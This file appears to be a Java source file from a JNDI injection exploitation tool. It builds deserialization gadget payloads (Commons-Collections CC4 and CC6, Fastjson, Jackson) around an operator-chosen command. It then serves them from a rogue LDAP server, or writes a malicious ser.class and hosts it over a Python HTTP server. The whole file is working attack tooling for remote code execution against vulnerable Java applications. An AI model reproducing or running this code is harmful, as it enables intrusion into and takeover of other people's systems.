package utools;

import org.apache.commons.cli.CommandLine;
import start.ButtonPanel;
import util.CC4;
import util.Gadget;

import java.io.*;
import java.net.UnknownHostException;
import java.util.Base64;

import static start.ButtonPanel.cmdOptions;
import static utools.Service.launchLDAPServer;
import static utools.checkPanel.listenHTTPServer;

public class Run {
    public static Process exec;
    public static void other() throws Exception {
        String[] args = ButtonPanel.globalArgs;
        CommandLine cmd = cmdOptions(args);
        if (!cmd.hasOption("c")){
        Object[] result = checkPanel.checkPanel();
        String port = (String) result[0];
        String selectedOption = (String) result[1];
        String b64 = (String) result[2];
        String type = (String) result[3];
        switch (selectedOption){
            case "base64":
                byte[] decodedBytes = Base64.getDecoder().decode(b64);
                switch (type){
                    case "LDAP":
                        launchLDAPServer(Integer.valueOf(port), decodedBytes);
                        break;
                    case "HTTP":
                        Httpserver(decodedBytes);
                        break;
                }
                break;
            case "file":
                FileInputStream fis = new FileInputStream(b64);
                byte[] bytes = new byte[fis.available()];
                fis.read(bytes);
                switch (type){
                    case "LDAP":
                        launchLDAPServer(Integer.valueOf(port), bytes);
                        break;
                    case "HTTP":
                        Httpserver(bytes);
                        break;
                }
                break;
        }
        }
    }
    public static void pop() throws Exception{
        Object[] pop = checkPanel.normal();
        String port = (String) pop[0];
        String commend = (String) pop[1];
        String selectedOption = (String) pop[2];
        switch (selectedOption){
            case "cc4":
                byte[] c4 = CC4.cc4(commend);
                launchLDAPServer(Integer.valueOf(port),c4);
                break;
            case "cc6":
                byte[] c6 = Gadget.cc6(commend);
                launchLDAPServer(Integer.valueOf(port),c6);
                break;
            case "fastjson83":
                byte[] f83 = Gadget.fastjson49_83(commend);
                launchLDAPServer(Integer.valueOf(port),f83);
                break;
            case "jackson":
                byte[] js = Gadget.jackson(commend);
                launchLDAPServer(Integer.valueOf(port),js);
                break;
        }
    }
    public static void Httpserver(byte[] file) throws UnknownHostException {
            Thread listeningThread = new Thread(() -> {
                    // 将文件写入本地
                FileOutputStream fos = null;
                try {
                    fos = new FileOutputStream("ser.class");
                } catch (FileNotFoundException e) {
                    throw new RuntimeException(e);
                }
                try {
                    fos.write(file);
                } catch (IOException e) {
                    throw new RuntimeException(e);
                }
                try {
                    fos.close();
                } catch (IOException e) {
                    throw new RuntimeException(e);
                }
                // 启动Python HTTP服务器
                try {
                    exec = Runtime.getRuntime().exec("python3 -m http.server 33221");
                } catch (IOException e) {
                    throw new RuntimeException(e);
                }
            });
            listeningThread.start();
            listenHTTPServer("33221", listeningThread);
        }
    }

